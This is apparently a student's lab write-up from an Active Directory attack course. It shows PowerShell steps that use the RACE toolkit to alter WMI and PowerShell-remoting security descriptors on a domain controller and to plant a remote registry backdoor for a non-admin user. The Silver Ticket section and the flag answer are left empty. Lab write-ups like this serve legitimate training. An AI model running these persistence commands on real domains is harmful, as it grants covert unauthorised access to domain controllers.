---
icon: vial
---

# 13 - Learning Object1️3️---

## Tasks



1 - Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access

2 - Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI

Flag 22 \[dcorp-dc] - SDDL string that provides studentx same permissions as BA on root\cimv2 WMI namespace. Flag value is the permissions string from (A;CI;Permissions String;;;SID) 🚩

## Solutions

### 1 - Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access

Remembering that once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges.

So, run as Domain Administrator the following commands to modify the host security descriptors for WMI on the DC to allow student867 access to WMI using RACE toolkit:

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\RACE.ps1
Set-RemoteWMI -SamAccountName student867 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Now, go to a normal student867 shell for checking if we're able to execute WMI queries on the DC:

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\RACE.ps1
gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>



```
Set-RemotePSRemoting -SamAccountName student867 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```





```
Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```







```
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student867 -Verbose
```









### 2 - Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI









```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Powerview.ps1
```



```bash
```





### Flag 22 \[dcorp-dc] - SDDL string that provides studentx same permissions as BA on root\cimv2 WMI namespace. Flag value is the permissions string from (A;CI;Permissions String;;;SID) 🚩















